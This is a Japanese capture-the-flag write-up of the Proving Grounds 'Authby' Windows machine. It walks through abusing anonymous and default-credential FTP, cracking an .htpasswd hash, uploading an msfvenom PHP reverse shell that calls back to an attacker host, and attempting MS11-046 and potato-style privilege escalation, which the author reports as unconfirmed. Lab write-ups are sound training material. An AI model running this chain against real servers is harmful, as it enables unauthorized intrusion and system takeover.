+++
title = "Proving Grounds Practice - Authby Writeup"
date = "2026-10-27"
description = "Anonymous FTPで公開されたzFTPServerのアカウント情報を調査し、HTTP Basic認証を突破。FTP経由でPHPリバースシェルを配置してApacheユーザーとして初期侵入し、Windows Server 2008のローカル権限昇格を調査"
tags = ["Proving Grounds Practice", "CTF", "[Windows]", "[Authby]", "[FTP Anonymous Login]", "[zFTPServer]", "[HTTP Basic Auth]", "[PHP Reverse Shell]", "[MS11-046]", "[Privilege Escalation]", "[Hard]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Authby |
| OS | Windows |
| Difficulty | Hard |
| Target IP | 192.168.157.46 |
| Initial User | `livda\apache` |
| Initial Access | FTP credentials / PHP reverse shell |
| Privilege Escalation | MS11-046を調査（SYSTEM取得は未確認） |

---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対して全TCPポートのスキャン、サービス検出、デフォルトスクリプトを実行する。

```bash
nmap -sV -sC -p- 192.168.157.46
```

スキャン結果から、以下のポートが開いていることを確認した。

```text
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           zFTPServer 6.0 build 2011-10-17
242/tcp  open  http          Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
3145/tcp open  zftp-admin    zFTPServer admin
3389/tcp open  ms-wbt-server Microsoft Terminal Service
```

FTPではAnonymousログインが許可されていた。また、HTTPサービスではApache 2.2.21とPHP 5.3.8が稼働している。

RDPの情報から、対象ホスト名とOSバージョンも確認できた。

```text
Target_Name: LIVDA
NetBIOS_Computer_Name: LIVDA
Product_Version: 6.0.6001
```

この情報をもとに、FTPで公開されているファイル、zFTPServerのアカウント情報、Webサーバーの認証設定を調査する。

---

## Enumeration

### Anonymous FTP Login

FTPへ接続する。

```bash
ftp 192.168.157.46
```

Anonymousユーザーでログインする。

```text
220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
Name: anonymous
331 User name received, need password.
230 User logged in, proceed.
```

ログイン後、公開ディレクトリを確認する。

```text
ftp> dir
```

主なファイルとディレクトリは以下のとおり。

```text
zFTPServer.exe
UninstallService.bat
Uninstall.exe
Settings.ini
log/
extensions/
certificates/
accounts/
```

特に`accounts`ディレクトリには、FTPユーザーのアカウント情報らしきファイルが存在した。

```text
ftp> cd accounts
ftp> ls
```

```text
backup/
acc[Offsec].uac
acc[anonymous].uac
acc[admin].uac
```

Anonymousアクセスでアカウント関連ファイルの存在を確認できたため、FTPの認証設定を調査する。

### FTP Admin Credentials

調査の結果、次の認証情報を利用できた。

```text
Username: admin
Password: admin
```

この認証情報でFTPへ再接続する。

```bash
ftp 192.168.157.46
```

```text
Name: admin
Password: admin
230 User logged in, proceed.
```

ログインに成功したため、FTP上のWeb関連ファイルを確認する。

```text
ftp> prompt
ftp> mget *
```

取得したファイルは以下のとおり。

```text
index.php
.htpasswd
.htaccess
```

FTPで公開されたWeb関連ファイルが、HTTPサービスの認証突破につながる可能性がある。

### Analyze .htaccess

取得した`.htaccess`を確認する。

```bash
cat .htaccess
```

```apache
AuthName "Qui e nuce nuculeum esse volt, frangit nucem!"
AuthType Basic
AuthUserFile c:\\wamp\www\.htpasswd
<Limit GET POST PUT>
Require valid-user
</Limit>
```

この設定から、HTTP Basic認証が有効になっていることが分かる。

また、認証情報の参照先として次のファイルが指定されている。

```text
c:\wamp\www\.htpasswd
```

同じディレクトリから`.htpasswd`も取得できたため、認証ハッシュを調査する。

### Crack .htpasswd

`.htpasswd`の内容を確認する。

```bash
cat .htpasswd
```

```text
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

このハッシュをJohn the Ripperで解析する。

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt .htpasswd
```

解析結果は以下のとおり。

```text
elite (offsec)
```

HTTP Basic認証で利用できる認証情報を取得した。

```text
Username: offsec
Password: elite
```

### HTTP Basic Authentication

ブラウザでWebサービスへアクセスする。

```text
http://192.168.157.46:242/
```

認証情報を入力する。

```text
Username: offsec
Password: elite
```

認証後、Webページへアクセスできることを確認した。

ページには以下のメッセージが表示された。

```text
Qui e nuce nuculeum esse volt, frangit nucem!
```

認証を突破できたため、次にWebディレクトリを列挙し、アップロード可能なファイルやPHPの実行経路を調査する。

### Web Directory Enumeration

Gobusterを使用してディレクトリとファイルを列挙する。

```bash
gobuster dir \
  -u http://192.168.157.46:242/ \
  -w /usr/share/dirb/wordlists/common.txt \
  -x .txt,.php \
  -U offsec \
  -P elite
```

主な結果は以下のとおり。

```text
.htaccess   (Status: 403)
.htpasswd   (Status: 403)
index.php   (Status: 200)
phpmyadmin  (Status: 403)
```

`index.php`がHTTP 200を返しており、PHPが実行されるWeb環境であることが分かる。

FTPで利用できた`admin`アカウントにはWeb関連ファイルをアップロードできるため、FTPとWebのファイル配置が連動している可能性を調べる。

---

## Exploitation

### Generate PHP Reverse Shell

PHPが動作する環境であることを確認したため、PHPリバースシェルを生成する。

```bash
msfvenom -p php/reverse_php \
  LHOST=192.168.45.155 \
  LPORT=443 \
  -f raw \
  -o rev.php
```

生成時の出力では、ペイロードが`rev.php`に保存された。

```text
Payload size: 2663 bytes
Saved as: rev.php
```

ここで指定した`LHOST`は攻撃者側のIPアドレス、`LPORT`はリバース接続の待受ポートである。実際のラボ環境に合わせて設定する。

### Upload PHP File Through FTP

FTPの`admin`アカウントで対象へ接続する。

```bash
ftp 192.168.157.46
```

認証情報を入力する。

```text
Username: admin
Password: admin
```

ログイン後、Web関連ファイルが存在するディレクトリでPHPファイルをアップロードする。

```text
ftp> put rev.php
```

アップロードが完了したことを確認する。

```text
226 Closing data connection.
2663 bytes sent
```

FTPとWebの配置が連動していれば、アップロードしたファイルをHTTP経由で実行できる。

### Start Listener

攻撃者側でリバース接続を待ち受ける。

```bash
nc -lvnp 443
```

### Trigger PHP Reverse Shell

ブラウザからアップロードしたPHPファイルへアクセスする。

```text
http://192.168.157.46:242/rev.php
```

対象ホストから接続が確立した場合、待受側に接続ログが表示される。

取得したシェルでユーザーを確認する。

```cmd
whoami
```

初期侵入時のユーザーは以下のとおり。

```text
livda\apache
```

これにより、Apacheサービスの実行ユーザーとしてコマンドを実行できることを確認した。

---

## Privilege Escalation

### Identify Windows Version

初期シェルからOS情報を確認する。

```cmd
systeminfo
```

主な出力は以下のとおり。

```text
Host Name:                 LIVDA
OS Name:                   Microsoft Windows Server 2008 Standard
OS Version:                6.0.6001 Service Pack 1 Build 6001
System Type:               X86-based PC
```

対象はWindows Server 2008 Standard SP1の32-bit環境である。


```cmd
echo %COMSPEC%
echo %PROCESSOR_ARCHITECTURE%
```

```text
C:\Windows\system32\cmd.exe
x86
```


### Check Token Privileges


```cmd
whoami /priv
```


```text
SeChangeNotifyPrivilege          Enabled
SeImpersonatePrivilege           Enabled
SeCreateGlobalPrivilege          Enabled
SeIncreaseWorkingSetPrivilege    Disabled
```

`SeImpersonatePrivilege`が有効であることを確認した。

### PrintSpoofer Compatibility Check

PrintSpooferを実行したところ、次のエラーが発生した。

```text
This version of C:\Users\Public\PrintSpoofer.exe
is not compatible with the version of Windows you're running.
```

Spoolerサービスの状態は次のコマンドで確認できる。

```cmd
sc query Spooler
```

### GodPotato Compatibility Check

GodPotatoの.NET 2版を実行したところ、以下のエラーが発生した。

```text
[!] No combase module found
```

### MS11-046 (CVE-2011-1249)

次に、Windowsの既知の脆弱性であるMS11-046（CVE-2011-1249）に関連する実行ファイルを調査した。

対象ホストへ`ms11-046.exe`を配置し、実行した。

```cmd
ms11-046.exe
```

実行ログでは、対象環境を以下のように認識していた。

```text
[*] MS11-046 (CVE-2011-1249) x86 exploit
[*] Identifying OS
[+] 32-bit
[+] Windows Server 2008
```

さらに、必要なOSコンポーネントの検出と、脆弱性を利用するための処理が進行した。

```text
[*] Exploiting vulnerability
[*] Sending AFD socket connect request
[+] Done
[*] Elevating privileges to SYSTEM
[+] Done
[*] Spawning shell
```

実行ログは次のメッセージで終了した。

```text
[*] Exiting SYSTEM shell
```

`whoami /priv`でも、現在のシェルの`SeImpersonatePrivilege`が有効であることを確認した。

なんかうまくいかなかった。


### Privilege Escalation Status

| Technique | Result |
|-----------|--------|
| PrintSpoofer | Windowsとの互換性エラー |
| GodPotato-NET2 | `No combase module found` |
| MS11-046 | SYSTEMへの昇格を報告したが、現在のシェルで未確認 |
| Current User | `livda\apache` |

この段階では初期侵入に成功しているが、SYSTEM権限の取得は未確認である。

今後の検証では、対象OSに対応する権限昇格手法と実行条件を確認し、昇格後に起動したプロセスの実際のユーザーを個別に検証する必要がある。

---

## Summary

Authbyでは、Anonymous FTPで公開されているzFTPServerのファイルを調査するところから攻略を開始した。

FTPの`admin`アカウントでWeb関連ファイルを取得し、`.htpasswd`のハッシュをJohn the Ripperで解析した結果、HTTP Basic認証に利用できる認証情報を取得した。

さらに、FTP経由でPHPファイルを配置し、HTTPアクセスをトリガーとしてPHPリバースシェルを実行することで、`livda\apache`ユーザーとして初期侵入した。

その後、Windows Server 2008 Standard SP1 x86というOS情報と、`SeImpersonatePrivilege`が有効であることを確認した。PrintSpooferとGodPotatoは互換性に関するエラーが発生し、MS11-046はSYSTEMへの昇格を報告したものの、現在のシェルでは`livda\apache`のままであった。


### Attack Path

1. NmapでFTP、HTTP、zFTPServer管理ポート、RDPを発見。
2. Anonymous FTPで公開ファイルとアカウント情報を調査。
3. FTPの`admin`認証情報を利用してWeb関連ファイルを取得。
4. `.htpasswd`を解析し、`offsec:elite`を取得。
5. HTTP Basic認証を突破。
6. PHPリバースシェルを生成し、FTP経由でアップロード。
7. PHPファイルへアクセスし、`livda\apache`として初期侵入。
8. Windows Server 2008 SP1 x86と`SeImpersonatePrivilege`を確認。
9. PrintSpoofer、GodPotato、MS11-046を調査。


